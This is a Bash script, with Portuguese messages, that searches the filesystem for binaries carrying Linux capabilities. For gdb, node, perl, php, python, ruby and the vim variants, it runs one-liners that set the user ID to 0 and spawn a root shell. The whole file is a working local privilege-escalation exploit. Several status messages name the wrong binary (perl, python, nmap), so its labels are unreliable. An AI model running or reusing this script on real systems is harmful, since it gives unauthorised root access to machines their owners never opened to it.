#!/bin/bash

echo "[*] Procurando binários com capabilities..."

cmd=$(getcap -r / 2>/dev/null)
echo "$cmd" | while read -r l; do
    pathc=$(echo "$l" | cut -d' ' -f1)

    cap=$(basename "$pathc")

    case "$cap" in
        gdb)
            echo "[+] $pathc → perl com capabilities! Executando:"
            "$pathc" -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
            ;;
        node)
            echo "[+] $pathc → python com capabilities! Executando:"
            "$pathc" -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
            ;;
        perl)
            echo "[+] $pathc → ping com capabilities! (pouco útil)"
            "$pathc" -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
            ;;
        php)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            CMD="/bin/sh"
            "$pathc" -r "posix_setuid(0); system('$CMD');"
            ;;
        python | python3)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -c 'import os; os.setuid(0); os.system("/bin/sh")'
            ;;
        ruby)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
            ;;
        rview)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -c ':lua os.execute("reset; exec sh")'
            ;;
        rvim)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -c ':lua os.execute("reset; exec sh")'
            ;;
        view)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
            ;;
        vim)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
            ;;
        vimdiff)
            echo "[+] $pathc → nmap com capabilities! Abrindo modo interativo:"
            "$pathc" -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
            ;;
        *)
            echo "[-] $pathc → capability encontrada, sem exploit automático registrado."
            ;;
    esac
done